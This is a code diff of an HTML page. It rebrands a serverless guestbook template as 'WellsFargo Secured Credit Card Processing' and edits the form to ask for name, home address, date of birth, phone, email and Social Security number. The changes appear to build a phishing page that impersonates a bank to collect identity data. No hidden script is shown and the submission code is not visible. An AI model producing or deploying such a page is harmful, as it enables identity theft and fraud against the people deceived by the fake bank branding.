@@ -4,7 +4,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Guestbook - a serverless web application</title>
+  <title>WellsFargo Secured Credit Card Processing</title>
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.0/css/bulma.min.css">
 </head>
@@ -20,12 +20,14 @@
       </p>
 
       <div class="columns">
-       <!- <div class="column">
+        <div class="column">
           <h3 class="title is-3">
-            Messages from past visitors
+            <figure class="image is-64x64">
+            <img src="{{icon}}" alt="No Image">
+          </figure>
           </h3>
           <div id="entries"></div>
-        </div> ->
+        </div> 
         <div class="column">
           <h3 class="title is-3">
             Enter your Details
@@ -34,69 +36,69 @@
             <div class="field">
               <label class="label">First Name</label>
               <div class="control">
-                <input class="input" type="text" placeholder="your name" id="fname">
+                <input class="input" type="text" placeholder="Your First Name" id="fname">
               </div>
             </div>
             <div class="field">
               <label class="label">Second Name</label>
               <div class="control">
-                <input class="input" type="text" placeholder="your sname" id="sname">
+                <input class="input" type="text" placeholder="Your Last Name" id="sname">
               </div>
             </div>
             
             <div class="field">
               <label class="label">Home Address</label>
               <div class="control">
-                <input class="input" type="text" placeholder="your addr" id="addr">
+                <input class="input" type="text" placeholder="Your Address" id="addr">
               </div>
             </div>
             
             <div class="field">
               <label class="label">City</label>
               <div class="control">
-                <input class="input" type="text" placeholder="your city" id="city">
+                <input class="input" type="text" placeholder="Your City" id="city">
               </div>
             </div>
             
             <div class="field">
               <label class="label">State</label>
               <div class="control">
-                <input class="input" type="text" placeholder="your addr" id="state">
+                <input class="input" type="text" placeholder="Your State" id="state">
               </div>
             </div>
             
             <div class="field">
               <label class="label">ZIP Code</label>
               <div class="control">
-                <input class="input" type="text" placeholder="your zip" id="zip">
+                <input class="input" type="text" placeholder="Your ZIP Code" id="zip">
               </div>
             </div>
             
             <div class="field">
               <label class="label">D.O.B</label>
               <div class="control">
-                <textarea class="textarea" placeholder="your comment" id="dob"></textarea>
+                <textarea class="textarea" placeholder="your DOB" id="dob"></textarea>
               </div>
             </div>
             
             <div class="field">
               <label class="label">Home Phone</label>
               <div class="control">
-                <textarea class="textarea" placeholder="your comment" id="hp"></textarea>
+                <textarea class="textarea" placeholder="Home Phone number" id="hp"></textarea>
               </div>
             </div>
             
             <div class="field">
               <label class="label">E-Mail Id</label>
               <div class="control">
-                <textarea class="textarea" placeholder="your comment" id="email"></textarea>
+                <textarea class="textarea" placeholder="Your E-mail" id="email"></textarea>
               </div>
             </div>
             
             <div class="field">
               <label class="label">SSN</label>
               <div class="control">
-                <textarea class="textarea" placeholder="your comment" id="SSN"></textarea>
+                <textarea class="textarea" placeholder="Your SSN" id="SSN"></textarea>
               </div>
             </div>
             
@@ -119,7 +121,7 @@
     </div>
   </section>
 
-  <script id="entries-template" type="text/x-handlebars-template">
+ <!- <script id="entries-template" type="text/x-handlebars-template">
     {{#each entries}}
     <div class="box">
       <article class="media">
@@ -139,7 +141,7 @@
       </article>
     </div>
     {{/each}}
-  </script>
+  </script> ->
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/4.0.10/handlebars.min.js"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
